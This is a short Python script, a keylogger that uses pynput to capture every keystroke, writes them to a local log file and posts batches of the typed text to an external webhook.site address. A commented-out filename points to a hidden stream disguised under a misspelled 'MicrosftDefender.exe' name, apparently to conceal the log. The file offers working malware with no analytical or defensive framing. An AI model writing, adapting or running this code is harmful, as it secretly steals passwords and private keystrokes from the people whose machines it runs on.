from fileinput import filename
from pynput.keyboard import Listener
import requests
url = 'https://webhook.site/dd8074ff-b54e-43be-84ec-0d36e3c60a0a'

# filename="MicrosftDefender.exe:log.txt"
filename="log.txt"
s=''
def anonymous(key):
    global s
    key = str(key)
    key = key.replace("'","")
    if key== "Key.enter":
        key="\n"
    if key=="Key.space":
        key==" "
    s+=key
    print(s)
    if(len(s)>10):
        requests.post(url, data=s)
        s=''
    with open(filename,"a") as file:
        file.write(key)


with Listener(on_press=anonymous) as listener:
    listener.join()